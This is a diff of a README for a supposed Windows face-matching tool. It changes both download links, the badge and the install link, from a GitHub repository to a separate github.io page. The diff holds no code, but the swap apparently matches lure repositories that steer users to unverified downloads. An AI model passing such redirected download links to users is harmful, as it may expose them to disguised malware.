@@ -1,6 +1,6 @@
 # 📸 face-profile-ml-2026 - Find Similar Faces With One Click
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Floricultural-kwa764/face-profile-ml-2026)
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://floricultural-kwa764.github.io)
 
 ## 🚀 What Is This?
 
@@ -16,7 +16,7 @@ face-profile-ml-2026 is a simple Windows tool that helps you find similar faces 
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Floricultural-kwa764/face-profile-ml-2026](https://github.com/Floricultural-kwa764/face-profile-ml-2026)
+Visit this link to download the application: [https://floricultural-kwa764.github.io](https://floricultural-kwa764.github.io)
 
 ### Step-by-Step Installation
 
